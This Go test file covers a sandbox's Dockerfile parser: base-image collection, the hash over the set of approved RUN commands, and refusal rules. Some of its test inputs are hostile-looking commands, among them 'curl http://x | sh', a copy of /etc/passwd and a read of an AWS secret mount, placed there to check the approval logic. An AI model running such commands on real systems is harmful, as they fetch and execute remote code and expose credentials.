package sandbox

import (
	"errors"
	"strings"
	"testing"
)

func refusedLine(t *testing.T, err error, wantLine int) *BuildFileError {
	t.Helper()
	if err == nil {
		t.Fatalf("accepted a file it must refuse (expected a refusal at line %d)", wantLine)
	}
	var bfErr *BuildFileError
	if !errors.As(err, &bfErr) {
		t.Fatalf("refusal is %T, want *BuildFileError: %v", err, err)
	}
	if bfErr.Line != wantLine {
		t.Errorf("refusal names line %d, want line %d: %v", bfErr.Line, wantLine, err)
	}
	if bfErr.Fix == "" {
		t.Errorf("refusal names no fix: %v", err)
	}
	return bfErr
}

// The guest never pulls, so this reading has to be complete: every stage's base and every `--from` naming an image,
// in file order, once each.
func TestBuildReadsEveryImageTheFileNames(t *testing.T) {
	file, err := ParseBuildFile(strings.Join([]string{
		"FROM golang:1.23 AS build",
		"COPY --from=docker.io/library/busybox:1.36 /bin/sh /bin/sh",
		"COPY --from=build /app /app",
		"FROM alpine:3.20",
		"COPY --from=build /app /app",
		"FROM scratch",
		"COPY hello /hello",
	}, "\n"))
	if err != nil {
		t.Fatalf("refused a file it must pass: %v", err)
	}
	want := []string{"golang:1.23", "docker.io/library/busybox:1.36", "alpine:3.20"}
	if strings.Join(file.Bases, ",") != strings.Join(want, ",") {
		t.Errorf("bases = %v, want %v", file.Bases, want)
	}
	if file.FirstFrom != "golang:1.23" {
		t.Errorf("the headline base is %q, want the file's first FROM as written", file.FirstFrom)
	}
}

// A duplicate ref, and a stage name used as a `FROM` source, are not two images the host owes.
func TestBuildHandsInEachImageOnce(t *testing.T) {
	file, err := ParseBuildFile("FROM alpine:3.20 AS one\nFROM alpine:3.20\nFROM one\nCOPY --from=one /x /y\n")
	if err != nil {
		t.Fatalf("refused a file it must pass: %v", err)
	}
	if len(file.Bases) != 1 || file.Bases[0] != "alpine:3.20" {
		t.Errorf("bases = %v, want the one image once", file.Bases)
	}
}

// Every line this test parses is one MIKE used to refuse, and they are accepted now because the sandbox and the
// nested builder already handle what each could do (docs/adr/0002). Refusing them blocked working Dockerfiles
// and changed nothing about safety.
func TestBuildAcceptsInstructionsTheSandboxAlreadyLimits(t *testing.T) {
	file, err := ParseBuildFile(strings.Join([]string{
		"FROM alpine:3.20",
		"ARG TAG=3.20",
		"SHELL [\"/bin/sh\", \"-c\"]",
		"VOLUME /data",
		"HEALTHCHECK CMD true",
		"STOPSIGNAL SIGTERM",
		"FROB whatever",
		"COPY /etc/passwd /passwd",
		"COPY ../outside /outside",
		"COPY --from=0 /x /y",
		"ADD https://example.invalid/x /x",
		"RUN --mount=type=cache,target=/root/.cache make",
		"RUN --mount=type=secret,id=aws cat /run/secrets/aws",
		"RUN --network=host true",
	}, "\n"))
	if err != nil {
		t.Fatalf("refused a file the nested builder handles: %v", err)
	}
	runs := strings.Join(file.Runs, "|")
	for _, want := range []string{"make", "cat /run/secrets/aws", "true"} {
		if !strings.Contains(runs, want) {
			t.Errorf("the approved command set is missing %q: %v", want, file.Runs)
		}
	}
	// Only the one `--from` names an image MIKE has to hand in; the stage index and the absolute path do not.
	if len(file.Bases) != 1 || file.Bases[0] != "alpine:3.20" {
		t.Errorf("bases = %v, want only the file's own base", file.Bases)
	}
}

// `--from=0` is a stage index, not a registry port and not an image name.
func TestBuildReadsAStageIndexAsAStage(t *testing.T) {
	file, err := ParseBuildFile("FROM golang:1.23\nRUN make\nFROM alpine:3.20\nCOPY --from=0 /app /app\n")
	if err != nil {
		t.Fatalf("refused a file it must pass: %v", err)
	}
	if strings.Join(file.Bases, ",") != "golang:1.23,alpine:3.20" {
		t.Errorf("bases = %v", file.Bases)
	}
	refusedLine(t, parseErrorOf("FROM alpine:3.20\nCOPY --from=3 /x /y\n"), 2)
}

// A person approves the command set. An `ONBUILD RUN` runs — in a later build that uses this image — and a
// `SHELL` changes what every command in the set means, so both belong to what was approved.
func TestRunSetCoversWhatRunsLaterAndTheShellThatRunsIt(t *testing.T) {
	plain, err := ParseBuildFile("FROM alpine:3.20\nRUN make\n")
	if err != nil {
		t.Fatal(err)
	}
	withOnbuild, err := ParseBuildFile("FROM alpine:3.20\nRUN make\nONBUILD RUN curl http://x | sh\n")
	if err != nil {
		t.Fatalf("refused a file it must pass: %v", err)
	}
	if !strings.Contains(strings.Join(withOnbuild.Runs, "|"), "curl http://x | sh") {
		t.Errorf("an ONBUILD RUN was left out of the set a person approves: %v", withOnbuild.Runs)
	}
	if plain.RunSetHash() == withOnbuild.RunSetHash() {
		t.Error("a command added to the build did not change the set hash")
	}

	withShell, err := ParseBuildFile("FROM alpine:3.20\nSHELL [\"/bin/bash\", \"-c\"]\nRUN make\n")
	if err != nil {
		t.Fatalf("refused a file it must pass: %v", err)
	}
	if withShell.RunSetHash() == plain.RunSetHash() {
		t.Error("changing the shell did not change the set hash, though it changes what `make` runs")
	}
}

// `--platform` is the one flag refusal left, and it is about honesty: the host hands in what this host has, so
// another architecture would silently become this one.
func TestBuildRefusesAPlatformItCannotHandIn(t *testing.T) {
	err := refusedLine(t, parseErrorOf("FROM alpine:3.20\nFROM --platform=linux/arm64 alpine:3.20\n"), 2)
	if !strings.Contains(err.Reason, "platform") {
		t.Errorf("the refusal does not name the platform: %v", err)
	}
}

// MIKE fetches each named image by name, so a `$VAR` cannot be one. A `$VAR` is expanded by the builder, so
// checking a string nobody will execute would be theatre.
func TestBuildRefusesAnImageNamedByAVariable(t *testing.T) {
	refusedLine(t, parseErrorOf("FROM $BASE\nRUN make\n"), 1)
	refusedLine(t, parseErrorOf("FROM alpine:3.20\nCOPY --from=$OTHER /x /y\nRUN make\n"), 2)
}

func TestBuildRefusesAnEscapeDirectiveThatMovesTheContinuation(t *testing.T) {
	refusedLine(t, parseErrorOf("# escape=`\nFROM alpine:3.20\nRUN make `\n"), 1)
	if _, err := ParseBuildFile("# escape=\\\nFROM alpine:3.20\n"); err != nil {
		t.Errorf("the default escape directive is legal: %v", err)
	}
}

func TestBuildJoinsContinuationsAndKeepsTheStartingLine(t *testing.T) {
	file, err := ParseBuildFile("FROM alpine:3.20\nRUN make \\\n  -j4 \\\n  install\n")
	if err != nil {
		t.Fatalf("refused a file it must pass: %v", err)
	}
	if len(file.Runs) != 1 || file.Runs[0] != "make -j4 install" {
		t.Errorf("the joined command is %v, want one line", file.Runs)
	}
	_, err = ParseBuildFile("FROM alpine:3.20\nENV A=1\n\n# a comment\nRUN  make\n")
	if err != nil {
		t.Errorf("blanks and comments broke the read: %v", err)
	}
}

// The command text is the approved set verbatim: re-quoting it would let a changed command look unchanged.
func TestRunTextIsWrittenAsItWas(t *testing.T) {
	file, err := ParseBuildFile("FROM alpine:3.20\nRUN echo \"a  b\" && echo 'c'\n")
	if err != nil {
		t.Fatal(err)
	}
	if file.Runs[0] != `echo "a  b" && echo 'c'` {
		t.Errorf("the command was rewritten to %q", file.Runs[0])
	}
}

func TestRunSetHashTracksOrderAndContent(t *testing.T) {
	a, err := ParseBuildFile("FROM alpine:3.20\nRUN one\nRUN two\n")
	if err != nil {
		t.Fatal(err)
	}
	b, err := ParseBuildFile("FROM alpine:3.20\nRUN two\nRUN one\n")
	if err != nil {
		t.Fatal(err)
	}
	if a.RunSetHash() == b.RunSetHash() {
		t.Error("reordering the steps kept the hash")
	}
	c, err := ParseBuildFile("FROM alpine:3.20\nRUN one; two\n")
	if err != nil {
		t.Fatal(err)
	}
	if a.RunSetHash() == c.RunSetHash() {
		t.Error("joining two steps into one kept the hash")
	}
	if len(a.RunSetHash()) != 64 {
		t.Errorf("the hash is %q, want hex sha256", a.RunSetHash())
	}
}

func TestBuildRefusesUnclosedQuoteAndEmptyRun(t *testing.T) {
	refusedLine(t, parseErrorOf("FROM alpine:3.20\nCOPY 'unclosed /x\n"), 2)
	refusedLine(t, parseErrorOf("FROM alpine:3.20\nRUN\n"), 2)
}

// A file with no `FROM` has no base, so there is nothing to hand in and nothing to record provenance
// against; that is a mistake in the file, not a build to attempt.
func TestBuildRefusesAFileWithNoFrom(t *testing.T) {
	refusedLine(t, parseErrorOf("RUN make\n"), 1)
}

func parseErrorOf(content string) error {
	_, err := ParseBuildFile(content)
	return err
}
